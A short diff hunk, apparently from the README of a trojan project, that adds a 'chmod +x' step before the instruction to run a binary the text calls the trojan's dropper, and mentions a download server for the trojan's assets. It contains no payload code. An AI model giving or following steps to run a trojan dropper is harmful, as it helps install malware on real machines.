@@ -10,5 +10,6 @@ This is also the effective download server for the trojan's assets.
 Just run the dropper binary!
 
 ```bash
+chmod +x mikumiku.miku
 ./mikumiku.miku
 ```
